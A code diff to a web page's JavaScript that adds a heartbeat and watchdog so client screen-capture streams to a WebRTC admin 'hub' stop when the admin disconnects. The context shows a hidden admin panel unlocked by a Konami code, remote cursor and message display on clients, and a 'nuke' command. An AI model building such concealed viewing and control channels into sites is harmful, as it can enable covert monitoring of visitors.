@@ -674,7 +674,7 @@
   };
 
   // ─── hub (admin WebRTC) ──────────────────────────────────────
-  function startHub() { loadPeerJS(() => tryCreateHub(HUB)); }
+  function startHub() { if (hub) return; loadPeerJS(() => tryCreateHub(HUB)); }
 
   function tryCreateHub(id) {
     hub = new Peer(id, { debug: 0 });
@@ -683,6 +683,11 @@
       if (el) { el.textContent = 'hub online'; el.className = 'on'; }
       const pi = document.getElementById('cp-pid');
       if (pi) pi.textContent = pid;
+      // Heartbeat: broadcast presence + viewing state every 1s so clients
+      // detect when admin disconnects and stop streaming immediately.
+      setInterval(() => {
+        bcast({ type: 'admin-pulse', viewing: viewTarget !== null });
+      }, 1000);
     });
     hub.on('connection', conn => {
       conn.on('open', () => {
@@ -999,10 +1004,17 @@
       let lastMsg    = null;
       let stylesDone = false;
       let cursorColor = '#ff3232';
+      let lastPulse  = 0;
 
       cPeer.on('open', () => {
         tryConnect();
         setInterval(tryConnect, 1000);
+        // Watchdog: if pulse goes silent for 3s while capturing, stop stream
+        setInterval(() => {
+          if (capturing && lastPulse && Date.now() - lastPulse > 3000) {
+            stopCap(); hideCur();
+          }
+        }, 1000);
       });
 
       function tryConnect() {
@@ -1183,6 +1195,11 @@
         if (d.type === 'cursor')      { showCur(d.x, d.y); }
         if (d.type === 'hide-cursor') { hideCur(); }
         if (d.type === 'msg')         { showMsg(d.text, d.x||50, d.y||30); }
+        if (d.type === 'admin-pulse') {
+          lastPulse = Date.now();
+          // If admin is no longer actively viewing, stop any ongoing capture
+          if (!d.viewing && capturing) { stopCap(); hideCur(); }
+        }
         if (d.type === 'ping')        { try { adminConn?.send({ type: 'pong', pingTs: d.ts }); } catch {} }
         if (d.type === 'announce')    { window.notify?.(d.text || '', 'info', 10000); }
         if (d.type === 'nuke')        { doNuke(d.src); }
@@ -1287,10 +1304,18 @@
     if (isAdmin) {
       // Admin: panel opens via Konami code (← → ← → ↑ ↓ A B) + passcode
       // No visible button — keep it hidden
-      // Unlock secret/hidden themes for admin
+      // Unlock secret/hidden themes for admin (picker.js runs before us so option
+      // was still disabled when it tried to restore the value — fix it here)
       document.querySelectorAll('#themepicker option[disabled]').forEach(opt => {
         opt.disabled = false;
       });
+      const _picker = document.getElementById('themepicker');
+      if (_picker) {
+        const _saved = localStorage.getItem('theme');
+        if (_saved) _picker.value = _saved;
+      }
+      // Start hub for admin
+      startHub();
     } else {
       startBeacon();
       if (isApproved()) {
